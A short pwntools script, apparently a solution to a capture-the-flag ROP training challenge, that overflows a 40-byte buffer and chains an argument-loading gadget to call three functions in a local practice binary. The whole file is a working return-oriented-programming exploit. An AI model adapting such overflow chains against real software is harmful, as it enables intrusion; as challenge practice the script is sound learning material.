from pwn import *

filename = sys.argv[1]

p = process(filename)

elf = ELF(filename)

callme_one = 0x00401850
callme_two = 0x00401870
callme_three = 0x00401810
args_gadget = 0x00401ab0

ret = p64(args_gadget)
ret += p64(0x1)
ret += p64(0x2)
ret += p64(0x3)
ret += p64(callme_one)
ret += p64(args_gadget)
ret += p64(0x1)
ret += p64(0x2)
ret += p64(0x3)
ret += p64(callme_two)
ret += p64(args_gadget)
ret += p64(0x1)
ret += p64(0x2)
ret += p64(0x3)
ret += p64(callme_three)            # realistically we could just turn the args_gadget, 1, 2 ,3 into one var and add it to save time but i just copy pasted so I can refer to this and easily see the order.

payload = ''
payload += 'A'*40
payload += ret

output = p.recvuntil('> ')
print(output)

p.sendline(payload)

output = p.recv()
print(output)
